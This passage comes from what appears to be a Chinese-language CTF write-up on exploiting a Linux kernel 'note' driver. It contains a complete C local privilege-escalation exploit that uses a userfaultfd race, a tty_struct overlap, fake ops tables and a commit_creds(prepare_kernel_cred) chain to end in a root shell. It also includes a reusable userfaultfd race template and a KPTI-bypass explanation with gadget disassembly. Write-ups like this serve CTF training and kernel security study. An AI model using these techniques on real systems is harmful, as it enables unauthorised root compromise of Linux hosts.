class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">edit_thread</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] edit thread start!&quot;</span>);</span><br><span class="line">    noteedit(idx, <span class="number">0</span>, stuck_mapped_memory);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] edit thread end!&quot;</span>); <span class="comment">// won&#x27;t reach here</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">add_thread</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] add thread start!&quot;</span>);</span><br><span class="line">    noteadd(idx, <span class="number">0x60</span>, stuck_mapped_memory);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] add thread end!&quot;</span>); <span class="comment">// won&#x27;t reach here</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf_a[<span class="number">0x500</span>] = &#123;<span class="string">&quot;aaa&quot;</span>&#125;;</span><br><span class="line"><span class="type">size_t</span> buf_tty[<span class="number">0x100</span>], buf_fake_table[<span class="number">0x500</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line">    stuck_mapped_memory = mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);</span><br><span class="line"></span><br><span class="line">    OpenNote();</span><br><span class="line"></span><br><span class="line">    noteadd(<span class="number">0</span>, <span class="number">0x60</span>, buf_a);</span><br><span class="line">    noteadd(<span class="number">1</span>, <span class="number">0x60</span>, buf_a);</span><br><span class="line">    noteedit(<span class="number">1</span>, <span class="number">0x500</span>, buf_a);</span><br><span class="line">    noteedit(<span class="number">0</span>, TTY_STRUCT_SZIE, buf_a);</span><br><span class="line">    write(note_fd, buf_a, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> thr_edit, thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ready to open ptmx&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (tty_fd &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ErrExit(<span class="string">&quot;[-] ptmx open failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        read(note_fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (buf_tty[<span class="number">0</span>] == <span class="number">0x100005401</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] tty_struct found! fd = %d\n&quot;</span>, tty_fd);</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// tty_struct used our slab</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (buf_tty[<span class="number">0</span>] != <span class="number">0x100005401</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] leak failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> ptm_unix98_ops_addr = buf_tty[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span> ((ptm_unix98_ops_addr &amp; <span class="number">0xFFF</span>) == <span class="number">0x320</span>) ptm_unix98_ops_addr += <span class="number">0x120</span>;</span><br><span class="line">    <span class="type">size_t</span> work_for_cpu_fn_addr =  work_for_cpu_fn_off + ptm_unix98_ops_addr;</span><br><span class="line">    <span class="type">size_t</span> tty_struct_addr = buf_tty[<span class="number">10</span>] - <span class="number">0x50</span>;</span><br><span class="line">    <span class="type">size_t</span> commit_creds_addr = commit_creds_off + ptm_unix98_ops_addr;</span><br><span class="line">    <span class="type">size_t</span> prepare_kernel_cred_addr = prepare_kernel_cred_off + ptm_unix98_ops_addr;</span><br><span class="line">    kernel_base = prepare_kernel_cred_addr - <span class="number">0xA9EF0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] ptm_unix98_ops addr leaked, addr: 0x%lx\n&quot;</span>, ptm_unix98_ops_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] work_for_cpu_fn addr leaked, addr: 0x%lx\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] prepare_kernel_cred addr leaked, addr: 0x%lx\n&quot;</span>, prepare_kernel_cred_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] tty_struct addr leaked, addr: 0x%lx\n&quot;</span>, tty_struct_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> buf_gift[<span class="number">0x100</span>];</span><br><span class="line">    notegift(buf_gift);</span><br><span class="line">    <span class="type">size_t</span> note_0_addr = buf_gift[<span class="number">0</span> * <span class="number">2</span>];</span><br><span class="line">    <span class="type">size_t</span> note_1_addr = buf_gift[<span class="number">1</span> * <span class="number">2</span>];</span><br><span class="line">    assert(note_0_addr == tty_struct_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] note_1 addr leaked, addr: 0x%lx\n&quot;</span>, note_1_addr);</span><br><span class="line"></span><br><span class="line">    buf_tty[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">    buf_tty[<span class="number">3</span>] = note_1_addr;</span><br><span class="line">    buf_tty[<span class="number">4</span>] = prepare_kernel_cred_addr;</span><br><span class="line">    buf_tty[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    write(note_fd, buf_tty, <span class="number">0</span>); <span class="comment">// write to tty_struct</span></span><br><span class="line"></span><br><span class="line">    buf_fake_table[<span class="number">7</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    buf_fake_table[<span class="number">10</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    buf_fake_table[<span class="number">12</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    write(note_fd, buf_fake_table, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write(tty_fd, buf_a, 1);</span></span><br><span class="line">    ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line"></span><br><span class="line">    read(note_fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] prepare_kernel_cred finished, return 0x%lx\n&quot;</span>, buf_tty[<span class="number">6</span>]);</span><br><span class="line"></span><br><span class="line">    buf_tty[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">    buf_tty[<span class="number">3</span>] = note_1_addr;</span><br><span class="line">    buf_tty[<span class="number">4</span>] = commit_creds_addr;</span><br><span class="line">    buf_tty[<span class="number">5</span>] = buf_tty[<span class="number">6</span>];</span><br><span class="line">    write(note_fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write(tty_fd, buf_a, 1);</span></span><br><span class="line">    ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now uid = %d\n&quot;</span>, getuid());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] root now!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h2><p>userfaultfd配合copy_from_user或者copy_to_user在条件竞争中有着十分强大的作用</p><p>其作用就是监控在某一段内存中发生的页错误,并且可以由用户指定如何处理</p><p>一般情况下我们选择使用sleep()或者pause()等函数使该线程停下,这样让我们完成条件竞争构造uaf等,提供了十分便利的条件</p><p>不过在大概<code>5.11</code>版本前后,由于变量<code>sysctl_unprivileged_userfaultfd</code>不再被初识赋值为1,使得userfaultfd不再能被非root用户使用</p><p>一个模板:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">userfaultfd_stuck_handler</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler unblocked&quot;</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="comment">//这部分是缺页异常处理得到的页的内容填充</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RegisterUserfault</span><span class="params">(<span class="type">void</span> *fault_page, <span class="type">void</span>* handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features    = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="type">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="bypass-kpti"><a href="#bypass-kpti" class="headerlink" title="bypass kpti"></a>bypass kpti</h2><p>在没有开启 <code>KPTI</code>保护的内核中，每当执行用户空间代码时，<code>Linux</code>会在其分页表中保留整个内核内存的映射，即用户地址空间和内核地址空间将使用同一个页全局目录表，并保护其访问。</p><p><code>KPTI(Kernel page-table isolation)</code>，即内核页表隔离。通过把进程页表按照用户空间和内核空间隔离成两块来防止内核页表泄露。可以在<code>-append</code>选项下添加<code>kpti=1</code>或<code>nopti</code>来启用或禁用它。</p><p>而在开启了 <code>KPTI</code>保护的内核里，用户态页表包含了用户空间，其只含有一个用于处理中断的<code>kernel mapping PGD</code>。当用户空间访问内核时，会先陷入中断，进入处理中断的 <code>trampoline mapping</code>，该中断处理程序会建立一个正常的的<code>kernel mapping</code>的映射。</p><p>而为了实现 <code>PGD</code>的切换，内核增加了一组宏用来在进程进行用户态、内核态切换时进行页表切换。一个进程的内核态<code>PGD(4k)</code>和用户态 <code>PGD(4K)</code>一起形成了一个<code>8K</code>的 <code>PGD</code>。当中断发生时，内核使用切换 <code>CR3</code>寄存器来实现从用户态地址空间切换到内核态的地址空间。<code>CR3</code>的 <code>bit47-bit11</code>为 <code>PGD</code>的物理地址，最低为 <code>bit12</code>用于进行 <code>PGD</code>切换；<code>bit12=0</code>为内核态<code>PGD</code>，<code>bit12=1</code>为用户态 <code>PGD</code>。</p><p><code>CR3</code>的 <code>bit0-bit11</code>为 <code>asid(Address Space Identifier)</code>，<code>asid</code>也分为 内核态和用户态，最高位 <code>bit11</code>来进行 <code>asid</code>切换；<code>bit11=0</code>为内核态 <code>asid</code>，<code>bit11=1</code>为用户态 <code>asid</code>。</p><p><img src="https://p2.ssl.qhimg.com/t01219f81626fe6310c.png" alt="img"></p><p>那么一旦开启了 <code>KPTI</code>,由于内核态和用户态的页表不同，所以如果使用 <code>ret2user</code>或内核执行 <code>ROP</code>返回用户态时，由于内核态无法确定用户态的页表，所以会报出一个段错误。</p><h3 id="swap-CR3"><a href="#swap-CR3" class="headerlink" title="swap CR3"></a>swap CR3</h3><p>在一个开启 <code>KPTI</code>内核中会调用 <code>SWITCH_KERNEL_CR3_NO_STACK</code>函数来从用户态进入内核态，关键代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     rdi, cr3</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">and     rdi, <span class="number">0xFFFFFFFFFFFFE7FF</span></span><br><span class="line">mov     cr3, rdi</span><br></pre></td></tr></table></figure><p>该代码就是将 <code>CR3</code>的 第12位与第13位清零。而页表的第12位在 <code>CR4</code>寄存器的 <code>PCIDE</code>位开启的情况下，都是保留给 <code>OS</code>使用，这里只关心 <code>13</code>位置零即可，也就相当于将 <code>CR3-0x1000</code>。</p><p>而在从内核态返回用户态时会调用 <code>SWITCH_USER_CR3</code>宏来切换 <code>CR3</code>，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rdi, cr3</span><br><span class="line">or      rdi, <span class="number">1000</span>h</span><br><span class="line">mov     cr3, rdi</span><br></pre></td></tr></table></figure><p>所以，这里第一种方法就很类似绕过 <code>smep</code>的方法，即利用内核中已有 <code>gadget</code>来在返回用户态执行 <code>iretq/sysret</code>之前 设置 <code>cr3</code>。寻找 到 能够将 <code>cr3</code>寄存器 与 <code>0x1000</code>执行 或运算即可。</p><h3 id="swapgs-restore-regs-and-return-to-usermode"><a href="#swapgs-restore-regs-and-return-to-usermode" class="headerlink" title="swapgs_restore_regs_and_return_to_usermode"></a>swapgs_restore_regs_and_return_to_usermode</h3><p>第二种方法即直接利用 <code>swapgs_restore_regs_and_return_to_usermode</code>这个函数内的 <code>gadget</code>。其汇编代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600A34 <span class="number">41</span> <span class="number">5F</span>                          pop     r15</span><br><span class="line">.text:FFFFFFFF81600A36 <span class="number">41</span> <span class="number">5</span>E                          pop     r14</span><br><span class="line">.text:FFFFFFFF81600A38 <span class="number">41</span> <span class="number">5</span>D                          pop     r13</span><br><span class="line">.text:FFFFFFFF81600A3A <span class="number">41</span> <span class="number">5</span>C                          pop     r12</span><br><span class="line">.text:FFFFFFFF81600A3C <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF81600A3D <span class="number">5B</span>                             pop     rbx</span><br><span class="line">.text:FFFFFFFF81600A3E <span class="number">41</span> <span class="number">5B</span>                          pop     r11</span><br><span class="line">.text:FFFFFFFF81600A40 <span class="number">41</span> <span class="number">5</span>A                          pop     r10</span><br><span class="line">.text:FFFFFFFF81600A42 <span class="number">41</span> <span class="number">59</span>                          pop     r9</span><br><span class="line">.text:FFFFFFFF81600A44 <span class="number">41</span> <span class="number">58</span>                          pop     r8</span><br><span class="line">.text:FFFFFFFF81600A46 <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600A47 <span class="number">59</span>                             pop     rcx</span><br><span class="line">.text:FFFFFFFF81600A48 <span class="number">5</span>A                             pop     rdx</span><br><span class="line">.text:FFFFFFFF81600A49 <span class="number">5</span>E                             pop     rsi</span><br><span class="line">.text:FFFFFFFF81600A4A <span class="number">48</span> <span class="number">89</span> E7                       mov     rdi, rsp    </span><br><span class="line">.text:FFFFFFFF81600A4D <span class="number">65</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">24</span> <span class="number">25</span>+                mov     rsp, gs: <span class="number">0x5004</span><span class="comment">//从此处开始执行</span></span><br><span class="line">.text:FFFFFFFF81600A56 FF <span class="number">77</span> <span class="number">30</span>                       push    qword ptr [rdi+<span class="number">30</span>h]</span><br><span class="line">.text:FFFFFFFF81600A59 FF <span class="number">77</span> <span class="number">28</span>                       push    qword ptr [rdi+<span class="number">28</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5C FF <span class="number">77</span> <span class="number">20</span>                       push    qword ptr [rdi+<span class="number">20</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5F FF <span class="number">77</span> <span class="number">18</span>                       push    qword ptr [rdi+<span class="number">18</span>h]</span><br><span class="line">.text:FFFFFFFF81600A62 FF <span class="number">77</span> <span class="number">10</span>                       push    qword ptr [rdi+<span class="number">10</span>h]</span><br><span class="line">.text:FFFFFFFF81600A65 FF <span class="number">37</span>                          push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81600A67 <span class="number">50</span>                             push    rax</span><br><span class="line">.text:FFFFFFFF81600A68 EB <span class="number">43</span>                          nop</span><br><span class="line">.text:FFFFFFFF81600A6A <span class="number">0F</span> <span class="number">20</span> DF                       mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81600A6D EB <span class="number">34</span>                          jmp     <span class="number">0xFFFFFFFF81600AA3</span></span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600AA3 <span class="number">48</span> <span class="number">81</span> CF <span class="number">00</span> <span class="number">10</span>+                or      rdi, <span class="number">1000</span>h</span><br><span class="line">.text:FFFFFFFF81600AAA <span class="number">0F</span> <span class="number">22</span> DF                       mov     cr3, rdi</span><br><span class="line">.text:FFFFFFFF81600AAD <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600AAE <span class="number">5F</span>                             pop     rdi</span><br><span class="line">.text:FFFFFFFF81600AAF FF <span class="number">15</span> <span class="number">23</span> <span class="number">65</span> <span class="number">62</span>+                call    cs: SWAPGS</span><br><span class="line">.text:FFFFFFFF81600AB5 FF <span class="number">25</span> <span class="number">15</span> <span class="number">65</span> <span class="number">62</span>+                jmp     cs: INTERRUPT_RETURN</span><br><span class="line"></span><br><span class="line">_SWAPGS</span><br><span class="line">.text:FFFFFFFF8103EFC0 <span class="number">55</span>                             push    rbp</span><br><span class="line">.text:FFFFFFFF8103EFC1 <span class="number">48</span> <span class="number">89</span> E5                       mov     rbp, rsp</span><br><span class="line">.text:FFFFFFFF8103EFC4 <span class="number">0F</span> <span class="number">01</span> F8                       swapgs</span><br><span class="line">.text:FFFFFFFF8103EFC7 <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF8103EFC8 C3                             retn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_INTERRUPT_RETURN</span><br><span class="line">.text:FFFFFFFF81600AE0 F6 <span class="number">44</span> <span class="number">24</span> <span class="number">20</span> <span class="number">04</span>                 test    byte ptr [rsp+<span class="number">0x20</span>], <span class="number">4</span></span><br><span class="line">.text:FFFFFFFF81600AE5 <span class="number">75</span> <span class="number">02</span>                          jnz     native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81600AE7 <span class="number">48</span> CF                          iretq</span><br></pre></td></tr></table></figure><p>只需要从上述 <code>mov rsp, gs: 0x5004</code>代码处开始执行，就会依次执行 绕过 <code>kpti</code>和 <code>iretq/sysret</code>两种功能，自动返回用户态。</p><h2 id="rwlock"><a href="#rwlock" class="headerlink" title="rwlock"></a>rwlock</h2><p>Linux实现了一个读写锁</p><ul><li>当读锁被取出时,不能够取出写锁</li><li>当写锁被取出时,不能够取出任何锁</li></ul><p>也就是说读是可以多进程共享的,但写是进程独享的</p><p>具体实现暂时不深入聊了解</p><h2 id="check-object-size"><a href="#check-object-size" class="headerlink" title="__check_object_size"></a>__check_object_size</h2><p>在本题中出现了__check_object_size这么一个函数</p><p>一开始以为这个函数能够精准的检测一个object的大小,但实际上这个函数也只是能做一个粗略的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Validates that the given object is:</span></span><br><span class="line"><span class="comment"> * - not bogus address</span></span><br><span class="line"><span class="comment"> * - fully contained by stack (or stack frame, when available)</span></span><br><span class="line"><span class="comment"> * - fully within 